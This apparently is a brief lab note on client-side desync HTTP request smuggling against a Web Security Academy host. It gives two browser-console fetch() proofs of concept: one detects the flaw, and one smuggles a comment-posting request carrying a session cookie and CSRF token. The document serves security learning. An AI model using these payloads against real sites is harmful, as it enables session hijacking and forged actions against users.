CSD exists if you can change the content length to higher number but the server returns it right away.


Show it's vulnerable via the browser.  Enter this in console:
```js
fetch('https://web-security-academy.net/', {
    method: 'POST',
    body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x',
    mode: 'cors',
    credentials: 'include',
}).catch(() => {
        fetch('https://web-security-academy.net/en', {
        mode: 'no-cors',
        credentials: 'include'
    })
})
```

Then check network and you should see two request where the second one is the redirected 404.

Browser PoC, use this in the console. Update the 'smuggledRequest' with your payload you want smuggled:
```JS
smuggledRequest = [
    "POST /en/post/comment HTTP/1.1",
    "Host: web-security-academy.net",
    "Cookie: session=6hbk22fHnbiyMs7YQRRP6DPITOmABCkF;",
    "Content-Type: application/x-www-form-urlencoded",
    "Content-Length: 96",
    "Connection: keep-alive",
    "",
    "csrf=pcY4H6vG2f5NnvjvgZVldEjip9tsqNaB&postId=4&name=Wes&email=w%40g.com&website=&comment=comment"
].join("\r\n");

fetch('https://web-security-academy.net/', {
    method: 'POST',
    body: smuggledRequest,
    mode: 'cors',
    credentials: 'include',
}).catch(() => {
        fetch('https://web-security-academy.net/en', {
        mode: 'no-cors',
        credentials: 'include'
    })
})

```
